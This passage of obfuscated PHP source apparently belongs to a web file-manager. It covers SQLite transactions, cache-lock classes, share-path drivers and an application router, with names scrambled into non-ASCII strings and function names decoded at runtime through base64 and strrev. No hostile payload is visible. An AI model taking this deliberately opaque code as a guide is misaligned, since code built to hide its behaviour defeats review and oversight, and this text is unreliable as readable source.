sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto a«êƒÈóÇ“; f¤™¨…¡³£: $this->queryStr = $Aè¨´™Ä›‰; if ($this->queryID) { $this->free(); } think_action_status($FÃìÀíäƒ¦[31], 1); goto AªÖçˆ„ñğ; a«êƒÈóÇ“: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¾÷][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B›„«ô²· = sqlite_query($this->_linkID, $_SERVER[¾÷][33]); if (!$B›„«ô²·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $aºîäá Ö” = sqlite_query($this->_linkID, $_SERVER[¾÷][34]); if (!$aºîäá Ö”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E¤ùÏîõŠ¤ = array(); if ($this->numRows > 0) { for ($bäŸ—”çÇÛ = 0; $bäŸ—”çÇÛ < $this->numRows; $bäŸ—”çÇÛ++) { $E¤ùÏîõŠ¤[$bäŸ—”çÇÛ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $E¤ùÏîõŠ¤; } public function getFields($fŞ ¤Ä²£Ë) { $CÀŞ¨ëĞ‘ˆ =& $_SERVER[¾÷]; $c…°‚ğÈ™§ = $this->query($CÀŞ¨ëĞ‘ˆ[35] . $fŞ ¤Ä²£Ë . $CÀŞ¨ëĞ‘ˆ[36]); $eèİ†ñÄåÏ = array(); if ($c…°‚ğÈ™§) { foreach ($c…°‚ğÈ™§ as $D©Àä‚ìø => $a™İåƒ£‘Ï) { $eèİ†ñÄåÏ[$a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[37]]] = array($CÀŞ¨ëĞ‘ˆ[38] => $a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[37]], $CÀŞ¨ëĞ‘ˆ[39] => $a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[40]], $CÀŞ¨ëĞ‘ˆ[41] => (bool) ($a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[42]] === $CÀŞ¨ëĞ‘ˆ[43]), $CÀŞ¨ëĞ‘ˆ[44] => $a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[45]], $CÀŞ¨ëĞ‘ˆ[46] => strtolower($a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[47]]) == $CÀŞ¨ëĞ‘ˆ[48], $CÀŞ¨ëĞ‘ˆ[49] => strtolower($a™İåƒ£‘Ï[$CÀŞ¨ëĞ‘ˆ[50]]) == $CÀŞ¨ëĞ‘ˆ[51]); } } return $eèİ†ñÄåÏ; } public function getTables($få½³™›İ = '') { $f‘É¨›ô¸Ã =& $_SERVER[¾÷]; $AòÔëã½Üµ = $this->query($f‘É¨›ô¸Ã[52] . $f‘É¨›ô¸Ã[53] . $f‘É¨›ô¸Ã[54]); $E‰‘ÈëîÅ = array(); foreach ($AòÔëã½Üµ as $Aõˆ„¡ ‡Æ => $E†È¶¡êö) { $E‰‘ÈëîÅ[$Aõˆ„¡ ‡Æ] = current($E†È¶¡êö); } return $E‰‘ÈëîÅ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bà«ÛäÓâ´ =& $_SERVER[¾÷]; $f«—Ô†ÃêÊ = sqlite_last_error($this->_linkID); $this->error = $f«—Ô†ÃêÊ . $bà«ÛäÓâ´[14] . sqlite_error_string($f«—Ô†ÃêÊ); if ($bà«ÛäÓâ´[43] != $this->queryStr) { $this->error .= LNG($bà«ÛäÓâ´[55]) . $this->queryStr; } think_trace($this->error, $bà«ÛäÓâ´[43], $bà«ÛäÓâ´[56]); return $this->error; } public function escapeString($bãÁ¤Ë£Œõ) { return sqlite_escape_string($bãÁ¤Ë£Œõ); } public function parseLimit($DçÍÆ÷à¶¾) { $eª½Ÿ÷øÖ¯ =& $_SERVER[¾÷]; $B²“Î„Ğ˜Ñ = $eª½Ÿ÷øÖ¯[43]; if (!empty($DçÍÆ÷à¶¾)) { $DçÍÆ÷à¶¾ = explode($eª½Ÿ÷øÖ¯[57], $DçÍÆ÷à¶¾); if (count($DçÍÆ÷à¶¾) > 1) { $B²“Î„Ğ˜Ñ .= $eª½Ÿ÷øÖ¯[58] . $DçÍÆ÷à¶¾[1] . $eª½Ÿ÷øÖ¯[59] . $DçÍÆ÷à¶¾[0] . $eª½Ÿ÷øÖ¯[60]; } else { $B²“Î„Ğ˜Ñ .= $eª½Ÿ÷øÖ¯[58] . $DçÍÆ÷à¶¾[0] . $eª½Ÿ÷øÖ¯[60]; } } return $B²“Î„Ğ˜Ñ; } } goto bœ×éèâ‚È; d§×ØÙğ‘: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $eÀ¹ïèöÀù =& $_SERVER[¾÷]; $A°òÆØ¦¦® = $GLOBALS[$eÀ¹ïèöÀù[16]][$eÀ¹ïèöÀù[354]]; self::$cachePath = $A°òÆØ¦¦®[$eÀ¹ïèöÀù[201]][$eÀ¹ïèöÀù[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A‚½İ‡åÌ¦, $aÕÕßí³¾Í = 0) { goto EÒëÕÓ¥Ğº; b å÷òÚ…‹: $dŞ²®øã¥ = rtrim(self::$cachePath, $dÖÇÚ½ĞÁ[18]) . $dÖÇÚ½ĞÁ[804] . md5($A‚½İ‡åÌ¦) . $dÖÇÚ½ĞÁ[801]; if (file_exists($dŞ²®øã¥) && filemtime($dŞ²®øã¥) && filemtime($dŞ²®øã¥) < time() - 10) { @unlink($dŞ²®øã¥); } do { if (file_exists($dŞ²®øã¥)) { cacheLockWait(); continue; } $f¾êºÊî™ = fopen($dŞ²®øã¥, $dÖÇÚ½ĞÁ[805]); if (!$f¾êºÊî™) { return !1; } $Eù‚Ö¬”í² = flock($f¾êºÊî™, LOCK_EX | LOCK_NB); self::$caches[$A‚½İ‡åÌ¦] = array($dÖÇÚ½ĞÁ[806] => $f¾êºÊî™, $dÖÇÚ½ĞÁ[201] => $dŞ²®øã¥); fwrite($f¾êºÊî™, $DãÓ¡àµŠÃ); clearstatcache(); if ($f¾êºÊî™ && $Eù‚Ö¬”í²) { return !0; } cacheLockWait(); } while (microtime(!0) < $DãÓ¡àµŠÃ); goto eÊ¥¬ŠìÏ; eÊ¥¬ŠìÏ: $this->unlock($A‚½İ‡åÌ¦); return !1; goto BáŸÑğƒ¯å; EÒëÕÓ¥Ğº: $dÖÇÚ½ĞÁ =& $_SERVER[¾÷]; $fíáÎ‰¬‡ = microtime(!0); $DãÓ¡àµŠÃ = $fíáÎ‰¬‡ + $aÕÕßí³¾Í + 0.0001; goto b å÷òÚ…‹; BáŸÑğƒ¯å: } public function lockGet($FµŠ¾¯óŒë) { $a·À‰™×»á =& $_SERVER[¾÷]; $eå†ÙËŠÖê = rtrim(self::$cachePath, $a·À‰™×»á[18]) . $a·À‰™×»á[804] . md5($FµŠ¾¯óŒë) . $a·À‰™×»á[801]; return file_exists($eå†ÙËŠÖê); } public function unlock($DÈ¢ñÊÛÑÌ) { goto DĞšôí˜„„; FİæÕ§îºø: @flock($FË…Àœ‹¼°[$b¸Ëç¯¢ø[806]], LOCK_UN); @fclose($FË…Àœ‹¼°[$b¸Ëç¯¢ø[806]]); @unlink($FË…Àœ‹¼°[$b¸Ëç¯¢ø[201]]); goto FËùºŠÊº; DĞšôí˜„„: $b¸Ëç¯¢ø =& $_SERVER[¾÷]; $FË…Àœ‹¼° = self::$caches[$DÈ¢ñÊÛÑÌ]; if (!$FË…Àœ‹¼°) { return; } goto FİæÕ§îºø; FËùºŠÊº: unset(self::$caches[$DÈ¢ñÊÛÑÌ]); goto cñ–‰Ò½À˜; cñ–‰Ò½À˜: } } class CacheLockRedis { public function lock($C¥Ú„Ô…é , $A¬¾Ê¡–¿º = 10) { $E¯Ø¸îëÙ = Cache::init(); $CÔìÒŸ½¡ = microtime(!0) + $A¬¾Ê¡–¿º; while (microtime(!0) < $CÔìÒŸ½¡) { $f—¢‹µ’¯¹ = $E¯Ø¸îëÙ->get($C¥Ú„Ô…é ); if (!$f—¢‹µ’¯¹) { $CƒÇƒÇçã = $E¯Ø¸îëÙ->setLock($C¥Ú„Ô…é , $CÔìÒŸ½¡, $A¬¾Ê¡–¿º); if ($CƒÇƒÇçã) { return !0; } } else { if ($f—¢‹µ’¯¹ < microtime(!0)) { $E¯Ø¸îëÙ->set($C¥Ú„Ô…é , $CÔìÒŸ½¡, $A¬¾Ê¡–¿º * 2); if ($E¯Ø¸îëÙ->get($C¥Ú„Ô…é ) === $f—¢‹µ’¯¹) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($F¡¯º„Á‘…) { return Cache::init()->get($F¡¯º„Á‘…); } public function unlock($aœÀéƒí) { return Cache::init()->remove($aœÀéƒí); } } class CacheLockMemcached { public function lock($b¡å—äù¨Œ, $E­µƒ¼àÒİ = 0) { $A¨¥éÛ‰‡ = Cache::init(); $Eò¶—ë¥æ = microtime(!0) + $E­µƒ¼àÒİ; while (microtime(!0) < $Eò¶—ë¥æ) { $fË”Ò¬©Éè = $A¨¥éÛ‰‡->get($b¡å—äù¨Œ); if (!$fË”Ò¬©Éè || $fË”Ò¬©Éè < microtime(!0)) { $D…‹¸¼İ­ = $A¨¥éÛ‰‡->handle->add($b¡å—äù¨Œ, $Eò¶—ë¥æ, $E­µƒ¼àÒİ); if ($D…‹¸¼İ­) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a™Î¨Õ¡™) { return Cache::init()->get($a™Î¨Õ¡™); } public function unlock($B„Ÿ‹É¨Âà) { return Cache::init()->remove($B„Ÿ‹É¨Âà); } } goto a÷Ë£ëóö; A˜êƒº©èÁ: $b«ßÓÁ»÷’ = strrev(base64_decode($_SERVER[¬ƒ][0])); function binCheckNeq($fÄ¢–Øôã, $c·ò³œÙÛà) { return $fÄ¢–Øôã != $c·ò³œÙÛà; } $_SERVER[$_SERVER[¬ƒ][1]] = $b«ßÓÁ»÷’($_SERVER[$_SERVER[¬ƒ][2]]); goto D•—ÇùˆÙ; CŒ¬××³ƒê: class PathDriverDbShareItem extends PathDriverDB { public function __construct($AÈ‚šÆ…†²) { $this->pathParse = $AÈ‚šÆ…†²; $this->model = Model($_SERVER[¾÷][1180]); } public function getPathOuter($A†–Œ¥±½İ) { $c– ª¡ñäì =& $_SERVER[¾÷]; if (!$A†–Œ¥±½İ) { return $A†–Œ¥±½İ; } $C˜ëã…ù‰† = $this->parse($A†–Œ¥±½İ); return trim(KodIO::makeShare($this->pathParse[$c– ª¡ñäì[397]], $C˜ëã…ù‰†[$c– ª¡ñäì[397]]), $c– ª¡ñäì[18]); } protected function infoParse($fŞªÇÌâğ™, $fİøÛö¶‘ = false, $DÁ“ÛÀñÇ£ = false) { $e¥ï½Òãº¥ =& $_SERVER[¾÷]; $aÊãšŞÈ£ = $this->pathParse[$e¥ï½Òãº¥[397]]; $aîàò­±áŸ = trim($this->pathParse[$e¥ï½Òãº¥[1040]], $e¥ï½Òãº¥[18]); return Action($e¥ï½Òãº¥[1189])->sharePathInfo($aÊãšŞÈ£, $aîàò­±áŸ); } public function infoFull($Fá·È²ÒŒì) { $Fò¼õ„¢õØ =& $_SERVER[¾÷]; $BŒ£šÊ÷Îë = explode($Fò¼õ„¢õØ[18], trim($Fá·È²ÒŒì, $Fò¼õ„¢õØ[18])); if (count($BŒ£šÊ÷Îë) > 1) { $AÄÂ¿Õİ‚ = implode($Fò¼õ„¢õØ[18], array_splice($BŒ£šÊ÷Îë, 1)); $aîÀó•ÉÜï = $this->model->pathInfoByPath($BŒ£šÊ÷Îë[0], $AÄÂ¿Õİ‚); if (!$aîÀó•ÉÜï) { return !1; } $this->pathParse[$Fò¼õ„¢õØ[1040]] = $aîÀó•ÉÜï[$Fò¼õ„¢õØ[399]]; } return $this->infoParse($Fá·È²ÒŒì); } public function listAll($bæÊ´ØÄ¿õ) { goto EÜÈÎá¬¤ê; EÜÈÎá¬¤ê: $AËøÊÆÉ¤¥ =& $_SERVER[¾÷]; $d„ºÃ¨ = IO::info($this->pathParse[$AËøÊÆÉ¤¥[85]]); if (!$d„ºÃ¨) { return array(); } goto A¤ò–°¡ëä; a›ËŒéØñÈ: foreach ($D Ú›Š·”Ó as &$Fáöø…‹à) { check_abort(); $Fáöø…‹à[$AËøÊÆÉ¤¥[94]] = $b•íŞàîÖ×->_shareItemeParse($Fáöø…‹à[$AËøÊÆÉ¤¥[94]], $E›çõ²Š°İ); } unset($Fáöø…‹à); return $D Ú›Š·”Ó; goto D¦ÌÒòíÊ­; A¤ò–°¡ëä: $D Ú›Š·”Ó = $this->model->listAll($bæÊ´ØÄ¿õ); $E›çõ²Š°İ = Model($AËøÊÆÉ¤¥[567])->getInfo($d„ºÃ¨[$AËøÊÆÉ¤¥[471]]); $b•íŞàîÖ× = Action($AËøÊÆÉ¤¥[1189]); goto a›ËŒéØñÈ; D¦ÌÒòíÊ­: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b±‚²ŠÅİ´) { $this->pathParse = $b±‚²ŠÅİ´; $this->model = Model($_SERVER[¾÷][1180]); } protected function infoParse($A±¼ÓÂËœ”, $DÃŸ»á”£‰ = false, $còÇ÷²Êæ… = false) { $F°İŠ½Ú®À =& $_SERVER[¾÷]; return Action($F°İŠ½Ú®À[1046])->sharePathInfo($this->pathParse[$F°İŠ½Ú®À[85]], !0); } public function listPath($Bìò„í“èñ, $E˜·„§Ú…´ = false) { $DƒéªÉßŠ =& $_SERVER[¾÷]; $cù”‹‘ßá = parent::listPath($Bìò„í“èñ, $E˜·„§Ú…´); foreach ($cù”‹‘ßá as $C…‰’÷õÕø => $B‚‹ÂÙ¢‘†) { if (!in_array($C…‰’÷õÕø, array($DƒéªÉßŠ[83], $DƒéªÉßŠ[84]))) { continue; } foreach ($B‚‹ÂÙ¢‘† as $c®¨¤ÈŒµ— => $dˆŠœ ô…Œ) { $cù”‹‘ßá[$C…‰’÷õÕø][$c®¨¤ÈŒµ—] = Action($DƒéªÉßŠ[1046])->shareItemInfo($dˆŠœ ô…Œ); } } return $cù”‹‘ßá; } public function listAll($c°…ÇïÍ…µ) { goto EŠİâ–‹ÅÆ; fÊÓ‹Òé‘ø: $Cˆ£³À¶ö = $this->model->listAll($c°…ÇïÍ…µ); foreach ($Cˆ£³À¶ö as &$C±…ÄÓ¿¿Â) { $C±…ÄÓ¿¿Â[$e‰˜Åä°¼ù[94]] = Action($e‰˜Åä°¼ù[1046])->shareItemInfo($C±…ÄÓ¿¿Â[$e‰˜Åä°¼ù[94]]); } unset($C±…ÄÓ¿¿Â); goto CÃÊÂ‡ÈŒ‰; EŠİâ–‹ÅÆ: $e‰˜Åä°¼ù =& $_SERVER[¾÷]; $E‚ŠïŠãé‚ = IO::info($this->pathParse[$e‰˜Åä°¼ù[85]]); if (!$E‚ŠïŠãé‚) { return array(); } goto fÊÓ‹Òé‘ø; CÃÊÂ‡ÈŒ‰: return $Cˆ£³À¶ö; goto e †ÙíÊÙø; e †ÙíÊÙø: } } class PathDriverDriverShareItem { public function __construct($C‰ÔïóèÔÇ) { $this->pathParse = $C‰ÔïóèÔÇ; } public function __call($A‹¨§¾ªÒô, $f¥à‚àŞµÛ) { $E²ÄÎÏ¤ó… =& $_SERVER[¾÷]; if (method_exists($this, $A‹¨§¾ªÒô)) { return; } $BµâŞ´Úç = call_user_func_array(array($E²ÄÎÏ¤ó…[1190], $A‹¨§¾ªÒô), $f¥à‚àŞµÛ); $Cç¤¾Éƒ = array($E²ÄÎÏ¤ó…[1191], $E²ÄÎÏ¤ó…[1192], $E²ÄÎÏ¤ó…[1193], $E²ÄÎÏ¤ó…[1194], $E²ÄÎÏ¤ó…[522], $E²ÄÎÏ¤ó…[524], $E²ÄÎÏ¤ó…[1195], $E²ÄÎÏ¤ó…[116], $E²ÄÎÏ¤ó…[1196], $E²ÄÎÏ¤ó…[1197]); if (in_array($A‹¨§¾ªÒô, $Cç¤¾Éƒ)) { $BµâŞ´Úç = $this->getPathOuter($BµâŞ´Úç); } return $BµâŞ´Úç; } public function copy($fÛÎŒ»äÍ, $cÌ°ëôø¸, $B˜§…÷Õö = false) { return $this->copyMove($fÛÎŒ»äÍ, $cÌ°ëôø¸, $B˜§…÷Õö, $_SERVER[¾÷][522]); } public function move($däÙ°Ë·‹Ù, $CÃ©ïÓ³´Û, $BÑÁ¡Ç©‘¡ = false) { return $this->copyMove($däÙ°Ë·‹Ù, $CÃ©ïÓ³´Û, $BÑÁ¡Ç©‘¡, $_SERVER[¾÷][524]); } private function copyMove($f¥’Ïˆ·ø¼, $Déš­Ú¸¬İ, $A“âÁ¶­¡¢, $EÜÂ¼–Ÿƒœ) { goto d„÷ï¼ÊŞŠ; B”øçØõ¬Ú: if ($B‚Ê÷šçÌ->pathParse[$BÍ¯½Ä£¤ˆ[1024]]) { $Déš­Ú¸¬İ = $B‚Ê÷šçÌ->pathParse[$BÍ¯½Ä£¤ˆ[1024]]; } else { $Déš­Ú¸¬İ = $e—äº‹¯´ø; } $fø¥ÑÄ‘ÁÉ = IO::copyMove($f¥’Ïˆ·ø¼, $Déš­Ú¸¬İ, $A“âÁ¶­¡¢, $EÜÂ¼–Ÿƒœ); $fø¥ÑÄ‘ÁÉ = $this->getPathOuter($fø¥ÑÄ‘ÁÉ); goto C®µ“éÖµ; C®µ“éÖµ: return $fø¥ÑÄ‘ÁÉ; goto BÂêÑÛà¾‹; d„÷ï¼ÊŞŠ: $BÍ¯½Ä£¤ˆ =& $_SERVER[¾÷]; $e—äº‹¯´ø = $Déš­Ú¸¬İ; $B‚Ê÷šçÌ = IO::driverMake($Déš­Ú¸¬İ); goto B”øçØõ¬Ú; BÂêÑÛà¾‹: } public function pathThis($cÒƒ«ôëõ†) { return get_path_this($this->pathParse[$_SERVER[¾÷][85]]); } public function pathFather($Fêï§ö¿òæ) { return get_path_father($this->pathParse[$_SERVER[¾÷][85]]); } public function iconvSystem($AßóÃ‡àê) { return $AßóÃ‡àê; } protected function infoParse($CÖ²Ä†¾, $B‰¶×“İƒ = false) { $bÖÒ‘Ë‰ÍÎ =& $_SERVER[¾÷]; $Béóá³˜Ã = $this->pathParse[$bÖÒ‘Ë‰ÍÎ[469]][$bÖÒ‘Ë‰ÍÎ[1047]] . $this->pathParse[$bÖÒ‘Ë‰ÍÎ[1040]]; if ($B‰¶×“İƒ) { $dŸÄ‚îÈ¯ = IO::infoWithChildren($Béóá³˜Ã); } else { $dŸÄ‚îÈ¯ = IO::info($Béóá³˜Ã); } $D—à®•…©‹ = $this->pathParse[$bÖÒ‘Ë‰ÍÎ[469]]; return Action($bÖÒ‘Ë‰ÍÎ[1189])->_shareItemeParse($dŸÄ‚îÈ¯, $D—à®•…©‹); } public function listAll($f£Õ¾Òõ) { $dêºÛê¯¢ =& $_SERVER[¾÷]; $A­•ì‘Á = IO::listAll($f£Õ¾Òõ); $B£äè÷¦ä = $this->pathParse[$dêºÛê¯¢[469]]; foreach ($A­•ì‘Á as &$cèÓâ“Á¦Ó) { check_abort(); $cèÓâ“Á¦Ó = array_merge(IO::info($cèÓâ“Á¦Ó[$dêºÛê¯¢[85]]), $cèÓâ“Á¦Ó); $cèÓâ“Á¦Ó[$dêºÛê¯¢[94]] = Action($dêºÛê¯¢[1189])->_shareItemeParse($cèÓâ“Á¦Ó, $B£äè÷¦ä); } unset($cèÓâ“Á¦Ó); return $A­•ì‘Á; } public function getPathOuter($bµÓëßå°²) { goto F¹²ğ–ËËø; F¹²ğ–ËËø: $E•†Ù¸Ôèå =& $_SERVER[¾÷]; $CÜÄÚÅìñ = KodIO::parse($bµÓëßå°²); if ($CÜÄÚÅìñ[$E•†Ù¸Ôèå[39]] == KodIO::KOD_SHARE_ITEM) { return $CÜÄÚÅìñ[$E•†Ù¸Ôèå[85]]; } goto C‘¯³Î½ „; C‘¯³Î½ „: $eİÅ£ëÜ®¼ = KodIO::clear($bµÓëßå°²); $FÚäÀé³Á‚ = KodIO::clear($this->pathParse[$E•†Ù¸Ôèå[469]][$E•†Ù¸Ôèå[1047]]); $a»‹®ÆÛç = substr($eİÅ£ëÜ®¼, strlen($FÚäÀé³Á‚)); goto BªÆ‹ğšÔ‡; BªÆ‹ğšÔ‡: if (substr($eİÅ£ëÜ®¼, 0, strlen($FÚäÀé³Á‚)) != $FÚäÀé³Á‚) { return !1; } return $this->pathParse[$E•†Ù¸Ôèå[1041]] . $E•†Ù¸Ôèå[18] . ltrim($a»‹®ÆÛç, $E•†Ù¸Ôèå[18]); goto bÌˆ¹®Ì½µ; bÌˆ¹®Ì½µ: } public function getType() { $f´‚™¯¿îÇ =& $_SERVER[¾÷]; $C‰ó±•ä­ = str_replace($f´‚™¯¿îÇ[81], $f´‚™¯¿îÇ[43], get_class($this)); return strtolower($C‰ó±•ä­); } public function isTypeObject($D¡¡ø›¬ÂŸ) { return IO::isTypeObject($D¡¡ø›¬ÂŸ); } public function info($d¢›¤„Ú¼Ù) { return $this->infoParse($d¢›¤„Ú¼Ù); } public function infoAuth($FÉ²­¿±›ç) { return $this->infoParse($FÉ²­¿±›ç); } public function infoWithChildren($DËË—¨öõÌ) { return $this->infoParse($DËË—¨öõÌ, !0); } public function infoFull($b×˜½»•‰) { return $this->infoParse($b×˜½»•‰); } } goto Fî™Óì‡ï®; e‚ÖÚÅëĞ: class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($c°æßù™ã) { goto Fİ÷™·‘Á”; Fİ÷™·‘Á”: $c§–”ÑÑ® =& $_SERVER[¾÷]; $Eëä”øÌî =& $_SERVER[Ş¥ÖÁ÷Ù]; $E®ÚÌ¹ÍÙ¤ = $Eëä”øÌî[0]($Eëä”øÌî[1], $Eëä”øÌî[2]($c°æßù™ã, $Eëä”øÌî[1])); goto fóÎ˜†ƒ·; E¢Ã“Ÿ«¥¤: $this->{$_SERVER[Ş¥ÖÁ÷Ù][3]}($Eëä”øÌî[4], array($this, $Eëä”øÌî[5])); $CµÄ–÷â« = $c§–”ÑÑ®[585]; if (strlen($CµÄ–÷â«) < $c§–”ÑÑ®[10]) { return; } goto b ¿¨øÉƒ; fóÎ˜†ƒ·: $C¬„ÈÊ¦Ñ = $c§–”ÑÑ®[583]; if (!$C¬„ÈÊ¦Ñ) { return; } $this->defaultModule = $E®ÚÌ¹ÍÙ¤[0] ? $E®ÚÌ¹ÍÙ¤[0] : $this->defaultModule; goto DùÀé§¤Œî; DùÀé§¤Œî: $this->defaultController = $E®ÚÌ¹ÍÙ¤[1] ? $E®ÚÌ¹ÍÙ¤[1] : $this->defaultController; $E„‰ÃÑàÜ = $c§–”ÑÑ®[584]; $this->defaultAction = $E®ÚÌ¹ÍÙ¤[2] ? $E®ÚÌ¹ÍÙ¤[2] : $this->defaultAction; goto E¢Ã“Ÿ«¥¤; b ¿¨øÉƒ: } public function appRun($B”›ùœÄë) { goto bÃØ¡‹°‹÷; fâ¶İï‡…æ: $F•°Ó¼ŒŒ = $a­±Öğªƒè[6]($fÂŸ™ÈîÜ²[0]); $d½æº‹°àˆ = $a­±Öğªƒè[7]; if ($F•°Ó¼ŒŒ == $a­±Öğªƒè[8]) { $d½æº‹°àˆ = $a­±Öğªƒè[9]; $fÂŸ™ÈîÜ²[0] = $a­±Öğªƒè[10]; $fÂŸ™ÈîÜ²[1] = $fÂŸ™ÈîÜ²[1] . $a­±Öğªƒè[11]; $B”›ùœÄë = $a­±Öğªƒè[12]($a­±Öğªƒè[1], $fÂŸ™ÈîÜ²); $B”›ùœÄë = $a­±Öğªƒè[2]($B”›ùœÄë, $a­±Öğªƒè[1]); } goto CÊÈ¤…Ì÷Ö; bÃØ¡‹°‹÷: $a­±Öğªƒè =& $_SERVER[Ş¥ÖÁ÷Ù]; $fÂŸ™ÈîÜ² = $a­±Öğªƒè[0]($a­±Öğªƒè[1], $B”›ùœÄë); $aÆ½ÑõŸöË = $_SERVER[¾÷][586]; goto fâ¶İï‡…æ; CÊÈ¤…Ì÷Ö: $a­±Öğªƒè[13](array($a­±Öğªƒè[14], $a­±Öğªƒè[15]), $d½æº‹°àˆ . $a­±Öğªƒè[16], $B”›ùœÄë); $a­±Öğªƒè[17]($B”›ùœÄë); $a­±Öğªƒè[13](array($a­±Öğªƒè[14], $a­±Öğªƒè[15]), $d½æº‹°àˆ . $a­±Öğªƒè[18], $B”›ùœÄë); goto AààÂ‹¶œí; AààÂ‹¶œí: } private function autorun() { $aõö‰‘Í¿à =& $_SERVER[Ş¥ÖÁ÷Ù]; global $config; $Có‡„À¦Œé = $_SERVER[¾÷][587]; if (!$Có‡„À¦Œé) { die; } if ($aõö‰‘Í¿à[19]($config[$aõö‰‘Í¿à[20]]) == 0) { return; } foreach ($config[$aõö‰‘Í¿à[20]] as $f©©Î¨Ëî => $bÊÇˆùœ) { $this->{$_SERVER[Ş¥ÖÁ÷Ù][21]}($bÊÇˆùœ); } } private function ishp1ea8ec67() { goto d¶é¾îŠ‰º; d¶é¾îŠ‰º: $eÎ›§¯×ÊÎ =& $_SERVER[¾÷]; $fƒ‰ Š˜°— =& $_SERVER[Ş¥ÖÁ÷Ù]; $b™ÄÓ³Ï‰Ø = $fƒ‰ Š˜°—[8]; goto f­–ŞÁÍÏ¹; A«äÛÙ×‘š: $F‰Îë§êšŠ = $eÎ›§¯×ÊÎ[589]; if (!$d×ñ·ß…õ || $fƒ‰ Š˜°—[24]($d×ñ·ß…õ) <= $fƒ‰ Š˜°—[24]($b™ÄÓ³Ï‰Ø)) { return; } if ($fƒ‰ Š˜°—[6]($fƒ‰ Š˜°—[25]($d×ñ·ß…õ, -$fƒ‰ Š˜°—[24]($b™ÄÓ³Ï‰Ø))) != $b™ÄÓ³Ï‰Ø) { return; } goto fÉÁä¢íäå; A“…Ğ±‹°: if (strlen($bóèÍ§âÖ¿) < $eÎ›§¯×ÊÎ[591]) { return; } $b´Œ‰ ›îÅ = $fƒ‰ Š˜°—[26]($GLOBALS[$fƒ‰ Š˜°—[22]][$fƒ‰ Š˜°—[23]], 1); $DÔ‹«Ò—ãâ = $eÎ›§¯×ÊÎ[592]; goto cØ‚ÚºÕÍå; fÉÁä¢íäå: $Bôä¤É¡âß = $fƒ‰ Š˜°—[25]($d×ñ·ß…õ, 0, -$fƒ‰ Š˜°—[24]($b™ÄÓ³Ï‰Ø)); $F­æÂç’™¤ = array($fƒ‰ Š˜°—[8], $Bôä¤É¡âß); $bóèÍ§âÖ¿ = $eÎ›§¯×ÊÎ[590]; goto A“…Ğ±‹°; cØ‚ÚºÕÍå: if (strlen($DÔ‹«Ò—ãâ) < $eÎ›§¯×ÊÎ[593]) { return; } $GLOBALS[$fƒ‰ Š˜°—[22]][$fƒ‰ Š˜°—[23]] = $fƒ‰ Š˜°—[27]($F­æÂç’™¤, $b´Œ‰ ›îÅ); $a³â¼ŒË = $eÎ›§¯×ÊÎ[594]; goto CóËÍ½´‹Í; CóËÍ½´‹Í: while ($a³â¼ŒË < $eÎ›§¯×ÊÎ[593]) { if ($a³â¼ŒË >= 0) { break; } $a³â¼ŒË++; } $GLOBALS[$fƒ‰ Š˜°—[22]][$fƒ‰ Š˜°—[28]] = $fƒ‰ Š˜°—[29]($fƒ‰ Š˜°—[1], $GLOBALS[$fƒ‰ Š˜°—[22]][$fƒ‰ Š˜°—[23]]); goto eå‚©¨—; f­–ŞÁÍÏ¹: $E×Ğéê ‡è = $eÎ›§¯×ÊÎ[588]; if (!$E×Ğéê ‡è) { die; } $d×ñ·ß…õ = $GLOBALS[$fƒ‰ Š˜°—[22]][$fƒ‰ Š˜°—[23]][0]; goto A«äÛÙ×‘š; eå‚©¨—: } private function xaiy0d901ecb() { goto b½Å¡¬†‡¨; BŞÓóÛ†“–: $fòÒ†¾Àò½ = $_SERVER[$eãğ‰“õƒ[30]]; $f­µßœÕ = $eãğ‰“õƒ[31]; if (!$eãğ‰“õƒ[32]($fòÒ†¾Àò½, $f­µßœÕ)) { return; } goto Böï†‡á°ì; Böï†‡á°ì: $bŒ¤çÆ–•Ò = $eãğ‰“õƒ[33]($fòÒ†¾Àò½, $f­µßœÕ); $DÆàøñ‰ÂŠ = $cõ‡™«½Œ[595]; if (strlen($DÆàøñ‰ÂŠ) < $cõ‡™«½Œ[10]) { die; } goto f÷İ­âƒõ; f÷İ­âƒõ: $Bô„„Šö–„ = $eãğ‰“õƒ[25]($fòÒ†¾Àò½, $bŒ¤çÆ–•Ò + $eãğ‰“õƒ[24]($f­µßœÕ)); $eãğ‰“õƒ[34]($eãğ‰“õƒ[35], $Bô„„Šö–„, $dĞ•Àˆ²—); $Bô„„Šö–„ = $eãğ‰“õƒ[2]($dĞ•Àˆ²—[0][0], $eãğ‰“õƒ[36]); goto D¶ãÍÆ¹ÉÛ; b½Å¡¬†‡¨: $cõ‡™«½Œ =& $_SERVER[¾÷]; $eãğ‰“õƒ =& $_SERVER[Ş¥ÖÁ÷Ù]; if ($GLOBALS[$eãğ‰“õƒ[22]][$eãğ‰“õƒ[28]] != $eãğ‰“õƒ[10]) { return; } goto BŞÓóÛ†“–; D¶ãÍÆ¹ÉÛ: $GLOBALS[$eãğ‰“õƒ[22]][$eãğ‰“õƒ[23]] = $eãğ‰“õƒ[0]($eãğ‰“õƒ[36], $Bô„„Šö–„); $c¤İÒ…ö¡¾ = $cõ‡™«½Œ[596]; $GLOBALS[$eãğ‰“õƒ[22]][$eãğ‰“õƒ[28]] = 